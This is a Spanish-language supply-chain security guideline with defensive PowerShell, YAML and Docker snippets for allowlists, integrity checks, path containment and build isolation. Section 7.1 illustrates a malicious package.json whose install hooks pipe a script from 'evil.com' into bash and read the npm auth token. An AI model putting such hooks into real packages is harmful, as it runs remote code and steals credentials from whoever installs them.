# Supply Chain Security Guidelines — Agents_IA_TECH

**Versión:** 1.0.0  
**Fecha:** 2026-09-25  
**Fuente:** Threat Model STRIDE Spec #011 + ADR-0007  
**Estado:** Activo  

---

## 1. Principios Fundamentales

1. **Zero Trust Supply Chain** — No confiar en ninguna dependencia externa sin verificación
2. **Fail-Open by Default** — Fallos externos nunca bloquean el bootstrap/entorno
3. **Least Privilege** — Procesos de sync/build con permisos mínimos indispensables
4. **Containment Absoluto** — `proyect_ext/` aislado, sin escapes de ruta
5. **Auditabilidad Total** — Log inmutable de cada operación de supply chain

---

## 2. Allowlist de Fuentes Confiables

### 2.1 Dominios Permitidos (Hardcoded en upgrade_framework)

```powershell
$TrustedSources = @(
    @{ name = 'tokenslayer'; url = 'https://github.com/ajvikram/TokenSlayer'; type = 'git' }
    @{ name = 'spec-kit'; url = 'https://github.com/github/spec-kit'; type = 'git' }
    @{ name = 'graphify'; package = 'graphifyy[mcp]'; type = 'uv-tool' }
)
```

### 2.2 Validación Obligatoria

```powershell
function Test-TrustedSource($manifestEntry) {
    $trusted = $TrustedSources | Where-Object { $_.name -eq $manifestEntry.name }
    if (-not $trusted) {
        throw "Source '$($manifestEntry.name)' not in allowlist"
    }
    if ($manifestEntry.type -eq 'git' -and $manifestEntry.url -ne $trusted.url) {
        throw "URL mismatch for $($manifestEntry.name): expected $($trusted.url), got $($manifestEntry.url)"
    }
    return $true
}
```

**Regla**: `Test-TrustedGithubUrl` existente debe extenderse para validar TODAS las entradas del manifest.

---

## 3. Verificación de Integridad y Firmas

### 3.1 Esquema Manifest Extendido

```yaml
dependencies:
  tokenslayer:
    source: "github.com/ajvikram/TokenSlayer"
    version: "v1.2.3"           # tag o commit hash (NO branch móvil)
    integrity: "sha256-abc123..."   # OBLIGATORIO: checksum del artefacto esperado
    cosign:                      # OPCIONAL pero RECOMENDADO
      publicKey: "-----BEGIN PUBLIC KEY-----..."
      signature: "MEUCIQ..."
  spec-kit:
    source: "github.com/github/spec-kit"
    version: "v0.5.0"
    integrity: "sha256-def456..."
  graphify:
    type: "uv-tool"
    package: "graphifyy[mcp]"
    version: "0.1.0"
    integrity: "sha256-ghi789..."
```

### 3.2 Verificación Post-Clone/Install

```powershell
function Verify-Integrity($name, $path, $expectedHash) {
    $actual = Get-FileHash -Algorithm SHA256 -Path $path -ErrorAction Stop
    if ($actual.Hash -ne $expectedHash) {
        throw "Integrity check FAILED for $name: expected $expectedHash, got $($actual.Hash)"
    }
    Write-OK "Integrity verified for $name: $expectedHash"
}
```

---

## 4. Containment de proyect_ext/

### 4.1 Reglas Absolutas

1. **Raíz fija**: `proyect_ext/` SIEMPRE bajo `<project-root>/proyect_ext/`
2. **Sin rutas relativas**: Nunca `..`, `../..`, symlinks que escapen
3. **Validación realpath**: `Resolve-Path` antes de CADA escritura
4. **Sin symlinks**: Solo hardlinks/junctions permitidos dentro de containment

### 4.2 Implementación

```powershell
function Assert-Containment($rootPath, $targetPath) {
    $proyectExtRoot = Resolve-Path (Join-Path $rootPath 'proyect_ext')
    $resolvedTarget = Resolve-Path $targetPath -ErrorAction SilentlyContinue
    
    if (-not $resolvedTarget -or -not $resolvedTarget.Path.StartsWith($proyectExtRoot.Path)) {
        throw "CONTAINMENT VIOLATION: $targetPath escapes proyect_ext/"
    }
    
    # Verificar symlinks
    $item = Get-Item $resolvedTarget.Path -Force
    if ($item.LinkType -notin @('HardLink', 'Junction', $null)) {
        throw "SYMLINK DETECTED in containment: $($item.FullName) -> $($item.Target)"
    }
}
```

---

## 5. Fail-Open Pattern (Canónico)

### 5.1 Bootstrap Level

```powershell
try {
    $result = Invoke-UpgradeFramework @params -ErrorAction Stop
    if ($LASTEXITCODE -ne 0) {
        Write-Warn "upgrade_framework exited $LASTEXITCODE: $($result | Out-String). Continuing (fail-open)."
    }
} catch {
    Write-Warn "upgrade_framework failed: $_ — continuing bootstrap (fail-open)"
}
# NUNCA exit/throw aquí — bootstrap SIEMPRE continúa
```

### 5.2 upgrade_framework Level

```powershell
# Cada operación externa envuelta individualmente
foreach ($dep in $manifest.dependencies) {
    try {
        Sync-Dependency $dep
        Write-OK "Synced $($dep.name)"
    } catch {
        Write-Warn "Failed to sync $($dep.name): $_ — continuing with other deps"
        $partialFailure = $true
    }
}
# Exit code 0 si al menos uno tuvo éxito, o siempre 0 (política fail-open total)
exit 0
```

---

## 6. Secrets Management

### 6.1 Regla de Oro: NUNCA Secrets en Manifest

```yaml
# ❌ MAL - Secrets en manifest
dependencies:
  tokenslayer:
    source: "https://ghp_xxxx@github.com/ajvikram/TokenSlayer"

# ✅ BIEN - Solo URLs públicas
dependencies:
  tokenslayer:
    source: "https://github.com/ajvikram/TokenSlayer"
    version: "v1.2.3"
    integrity: "sha256-..."
```

### 6.2 Sanitización de Env Vars

```powershell
function Get-SafeEnvironment {
    $allowed = @('PATH', 'HOME', 'USERPROFILE', 'TEMP', 'TMP', 'SystemRoot')
    $safe = @{}
    foreach ($var in Get-ChildItem Env:) {
        if ($allowed -contains $var.Name) {
            $safe[$var.Name] = $var.Value
        }
    }
    return $safe
}
# Pasar $safeEnv a Start-Process / & invocaciones
```

---

## 7. Build Isolation

### 7.1 npm Scripts Peligrosos

```json
// package.json que EJECUTA CÓDIGO ARBITRARIO en install/build
{
  "scripts": {
    "prepare": "node malicious.js",
    "preinstall": "curl evil.com/steal.sh | bash",
    "postinstall": "npm config get //registry.npmjs.org/:_authToken"
  }
}
```

### 7.2 Mitigación Obligatoria

```powershell
# Opción A: --ignore-scripts (rápido, compatible)
npm ci --ignore-scripts --prefix $buildPath
npm run build --prefix $buildPath -- --ignore-scripts

# Opción B: Container sandbox (RECOMENDADO para producción)
docker run --rm \
  --network none \
  --read-only \
  --tmpfs /tmp \
  -v "$buildPath:/src:ro" \
  -v "$outputPath:/out" \
  node:20-alpine \
  sh -c "cd /src && npm ci --ignore-scripts && npm run build -- --ignore-scripts && cp -r dist/* /out/"
```

---

## 8. Git Clone Hardening

```powershell
# Parámetros OBLIGATORIOS para cada git clone
git clone \
  --depth=1 \                    # Shallow clone — sin historia completa
  --no-recurse-submodules \      # Sin submódulos maliciosos
  --branch $version \            # Tag/commit fijo, NUNCA branch móvil
  --single-branch \              # Solo la rama especificada
  $url $targetDir
```

---

## 9. Timeouts y Límites de Recursos

| Operación | Timeout | Límite |
|-----------|---------|--------|
| `upgrade_framework` total | 120s | RNF-05 |
| `git clone` individual | 60s | Por repo |
| `uv tool install` | 60s | graphify |
| `npm ci` | 180s | tokenslayer build |
| `npm run build` | 120s | tokenslayer build |
| Tamaño max `proyect_ext/` | 500MB | Disco |
| Tamaño max repo individual | 100MB | Clone |

---

## 10. Audit Logging Inmutable

### 10.1 Formato (JSON Lines)

```json
{"timestamp":"2026-09-25T10:30:00.000Z","operation":"upgrade_framework_sync","actor":"user","host":"host","manifestHash":"sha256-...","actions":[{"type":"clone","repo":"tokenslayer","commit":"abc123","status":"success"},{"type":"clone","repo":"spec-kit","commit":"def456","status":"success"},{"type":"uv-install","package":"graphifyy[mcp]","version":"0.1.0","status":"success"}],"result":"success"}
```

### 10.2 Propiedades del Log

- **Append-only**: Solo `Add-Content`, nunca sobrescribir
- **Permisos**: 644 (owner read/write, group/other read)
- **Ubicación**: `<project-root>/.bootstrap-audit.log`
- **Rotación**: Diaria, mantener 30 días
- **Integridad**: Hash chain opcional (hash línea anterior en línea actual)

---

## 11. Referencias Cruzadas

| Documento | Ubicación |
|-----------|-----------|
| Threat Model #011 | `specs/011-bootstrap-invokes-upgrade-framework/threat-model.md` |
| ADR-0007 | `arquitectura/adr/adr-0007-bootstrap-delegates-upgrade-framework.md` |
| Manifest Security | `seguridad/manifest-security.md` |
| Containment Rules | `seguridad/proyect_ext-containment.md` |
| Audit Logging Standard | `seguridad/audit-logging-standard.md` |
| Fail-Open Pattern | `seguridad/fail-open-pattern.md` |

---

*Documento vivo — actualizar con cada threat model nuevo*  
*Generado desde security-auditor — spec #011*